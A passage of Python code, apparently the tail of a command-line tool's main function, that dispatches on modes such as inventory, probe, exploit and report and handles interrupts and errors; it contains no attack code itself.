    try:
        if args.mode == "inventory":
            return _run_inventory_or_probe(args, "inventory")
        if args.mode == "probe":
            return _run_inventory_or_probe(args, "probe")
        if args.mode == "prove":
            return _run_prove(args)
        if args.mode == "exploit":
            return _run_exploit(args)
        if args.mode == "auto":
            return _run_auto(args)
        if args.mode == "report":
            return _run_report(args)
        if args.mode == "verify":
            return _run_verify(args)
    except SystemExit:
        raise
    except KeyboardInterrupt:
        print("interrupted; partial evidence was persisted where possible", file=sys.stderr)
        return 130
    except Exception as exc:
        print(f"error: {type(exc).__name__}: {exc}", file=sys.stderr)
        return 2
    parser.error("unknown mode")
    return 2
